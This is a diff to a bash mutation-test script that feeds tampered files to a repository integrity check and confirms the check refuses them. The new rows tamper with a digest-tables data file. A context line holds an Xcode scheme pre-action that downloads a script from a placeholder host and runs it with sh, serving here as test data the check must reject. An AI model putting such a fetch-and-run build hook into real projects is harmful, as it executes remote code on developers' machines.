@@ -24,7 +24,8 @@
 # the field separator here, so a script must be spelled with `/` delimiters and no pipe in it.
 #
 #   ROW = label | file under the apps/ios copy | sed script | substring the refusal must contain
-#   (a file prefixed `+ ^ @ = ~ !` adds rather than edits - see the row comments and the loop below)
+#   (a file prefixed `+ ^ @ = ~ !` adds rather than edits, `%` edits the data file of a repository copy - see the
+#   row comments and the loop below)
 set -uo pipefail
 cd "$(git rev-parse --show-toplevel)"
 
@@ -137,6 +138,17 @@ rows=(
   "T-0295 M3 an ignored xcuserdata scheme with a shell pre-action|!xcuserdata/!ScenicDrive.xcodeproj/xcuserdata/owner.xcuserdatad/xcschemes/ScenicDrive.xcscheme|<Scheme><BuildAction><PreActions><ExecutionAction ActionType=\"Xcode.IDEStandardExecutionActionsCore.ExecutionActionType.ShellScriptAction\"><ActionContent title=\"Run Script\" scriptText=\"curl -fsSL https://example.invalid/p -o /tmp/p; sh /tmp/p\"></ActionContent></ExecutionAction></PreActions></BuildAction></Scheme>|apps/ios: added ScenicDrive.xcodeproj/xcuserdata/owner.xcuserdatad/xcschemes/ScenicDrive.xcscheme"
   "T-0295 M3 an ignored Shadow.DS_Store|!*.DS_Store!Packages/ScenicApp/Shadow.DS_Store|Bud1|apps/ios: added Packages/ScenicApp/Shadow.DS_Store"
   "T-0295 M3 a tracked, ignored .DS_Store|!.DS_Store!Packages/ScenicApp/.DS_Store!add|Bud1|apps/ios: added Packages/ScenicApp/.DS_Store"
+  # Rows 53-59 are T-0303: -linked's four tables are DATA in ops/lib/check-safety-disclaimer-linked-digests.txt. A `%` row edits the repository copy's data
+  # file (the copy m<N> holds ops/ beside apps/ios, Package.swift and Sources/, git-initialised so the check's own cd
+  # to the top lands in it; `rm` deletes the file) and runs the check from there. 53-57 are the reader's five
+  # fail-closed branches; 58-59 are data-only edits with the tree untouched, red because every row is bound to bytes.
+  "T-0303 the approved tables file deleted|%ops/lib/check-safety-disclaimer-linked-digests.txt|rm|approved tables file ops/lib/check-safety-disclaimer-linked-digests.txt is missing"
+  "T-0303 an unknown section appended|%ops/lib/check-safety-disclaimer-linked-digests.txt|\$s#\$#\n[VENDOR_SOURCES]\nVendor/Handoff/AppleMapsDirections.swift 0000000000000000000000000000000000000000000000000000000000000000#|unknown section [VENDOR_SOURCES]"
+  "T-0303 a digest row duplicated|%ops/lib/check-safety-disclaimer-linked-digests.txt|/^Package.swift /p|duplicated path in [PINNED_ROOT_SOURCES]"
+  "T-0303 a digest row with a third field|%ops/lib/check-safety-disclaimer-linked-digests.txt|s#^\(Sources/Handoff/CreditLine.swift [0-9a-f]*\)\$#\1 approved#|malformed row in [PINNED_ROOT_SOURCES]"
+  "T-0303 the PINNED_APP_OTHER section emptied|%ops/lib/check-safety-disclaimer-linked-digests.txt|/^\[PINNED_APP_OTHER\]\$/,/^\[/{/^\[/!d}|empty section [PINNED_APP_OTHER]"
+  "T-0303 a digest edited in the data only|%ops/lib/check-safety-disclaimer-linked-digests.txt|s#^\(Sources/Handoff/AppleMapsDirections.swift \)[0-9a-f]*\$#\10000000000000000000000000000000000000000000000000000000000000000#|Sources/Handoff/AppleMapsDirections.swift content changed"
+  "T-0303 a path row deleted in the data only|%ops/lib/check-safety-disclaimer-linked-digests.txt|/^Sources\/ScenicKit\/Geo\/Geo.swift /d|root: added Sources/ScenicKit/Geo/Geo.swift"
 )
 
 # row_link TARGET LINK: a directory link picked by platform - a junction under git-bash (whose `ln -s` copies
@@ -170,6 +182,7 @@ for row in "${rows[@]}"; do
   # T-0289: the copy is laid out as the repository is - m<N>/apps/ios beside m<N>/Package.swift and m<N>/Sources/ -
   # because -linked derives the root package's tree as APP_TREE/../.. (no flag); a root row's path is ../../<file>.
   dir="$work/m$total/apps/ios"
+  run_at="$PWD"
   rm -rf "$work/m$total" && mkdir -p "$work/m$total/apps" && cp Package.swift "$work/m$total/" && \
     cp -R Sources "$work/m$total/Sources" || { echo "  CANNOT COPY the root package: $label"; exit 1; }
   cp -R "$APP_TREE" "$dir"
@@ -199,6 +212,12 @@ for row in "${rows[@]}"; do
     else
       git -C "$dir" check-ignore -q -- "$file" || { echo "  CANNOT IGNORE in the copy: $label"; exit 1; }
     fi
+  elif [[ "$file" == "%"* ]]; then
+    file="${file#?}"; run_at="$work/m$total"
+    cp -R ops "$run_at/ops" && git init -q "$run_at" && git -C "$run_at" config core.excludesFile "$work/no-excludes" && \
+      [[ -f "$run_at/$file" ]] || { echo "  CANNOT COPY ops/ into the repository copy: $label"; exit 1; }
+    if [[ "$script" == rm ]]; then rm "$run_at/$file"; else sed -i -e "$script" "$run_at/$file"; fi
+    cmp -s "$file" "$run_at/$file" && { echo "  THE MUTATION CHANGED NOTHING: $label"; exit 1; }
   elif [[ "$file" == [+@=^]* ]]; then
     kind="${file:0:1}"; file="${file#?}"
     [[ "$kind" != "^" ]] || mkdir -p "$dir/$(dirname "$file")"
@@ -221,7 +240,7 @@ for row in "${rows[@]}"; do
     cmp -s "$APP_TREE/$efile" "$dir/$efile" && { echo "  THE SECOND EDIT CHANGED NOTHING: $label"; exit 1; }
   fi
 
-  out="$(bash "$CHECK" --sources "$dir/$FS" --app-tree "$dir" 2>&1)"
+  out="$(cd "$run_at" && bash "$CHECK" --sources "$dir/$FS" --app-tree "$dir" 2>&1)"
   status=$?
 
   named="no"
